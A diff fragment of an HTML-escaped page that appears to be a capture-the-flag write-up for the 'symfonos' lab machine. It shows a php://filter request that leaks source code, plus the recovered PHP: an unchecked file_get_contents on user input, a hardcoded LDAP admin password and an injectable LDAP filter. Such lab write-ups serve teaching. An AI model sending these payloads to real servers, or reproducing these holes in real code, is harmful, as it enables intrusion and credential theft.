-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> Login
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">} else {
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> Login
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
